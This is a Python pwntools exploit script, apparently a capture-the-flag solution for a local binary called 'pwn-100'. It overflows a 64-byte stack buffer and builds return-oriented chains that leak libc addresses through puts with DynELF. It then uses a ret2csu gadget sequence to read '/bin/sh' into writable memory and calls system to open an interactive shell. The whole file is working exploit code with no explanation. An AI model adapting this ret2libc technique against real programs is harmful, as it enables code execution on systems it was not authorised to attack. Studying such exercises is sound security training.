from pwn import *

p = process("./pwn-100")
elf = ELF("./pwn-100")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

readplt = elf.symbols['read']
readgot = elf.got['read']
putsplt = elf.symbols['puts']
putsgot = elf.got['puts']
mainaddress = 0x4006b8
startaddress = 0x400550
poprdi = 0x400763
pop6address = 0x40075a
movcalladdress = 0x400740
waddress = 0x601000

def leak(address):
    count = 0
    data = b""
    payload = b"A" * 64 + b"A" * 8
    payload += p64(poprdi) + p64(address)
    payload += p64(putsplt)
    payload += p64(startaddress)
    payload = payload.ljust(200, b"B")
    p.send(payload)
    print(p.recvuntil(b'bye~\n'))
    up = b""
    while True:
        c = p.recv(numb=1, timeout=0.5)
        count += 1
        if up == b'\n' and c == b"":
            data = data[:-1]
            data += b"\x00"
            break
        else:
            data += c
        up = c
    data = data[:4]
    log.info(f"{hex(address)} => {data}")
    return data

d = DynELF(leak, elf=elf)
libc.address = d.libbase
systemAddress = libc.symbols['system']
print("systemAddress:", hex(systemAddress))
print("-----------write /bin/sh to bss--------------")
payload1 = b"A" * 64 + b"A" * 8
payload1 += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(waddress) + p64(0)
payload1 += p64(movcalladdress)
payload1 += b'\x00' * 56
payload1 += p64(startaddress)
payload1 = payload1.ljust(200, b"B")
p.send(payload1)
print(p.recvuntil(b'bye~\n'))
p.send(b"/bin/sh\x00")
print("-----------get shell--------------")
payload2 = b"A" * 64 + b"A" * 8
payload2 += p64(poprdi) + p64(waddress)
payload2 += p64(systemAddress)
payload2 += p64(startaddress)
payload2 = payload2.ljust(200, b"B")
p.send(payload2)
p.interactive()
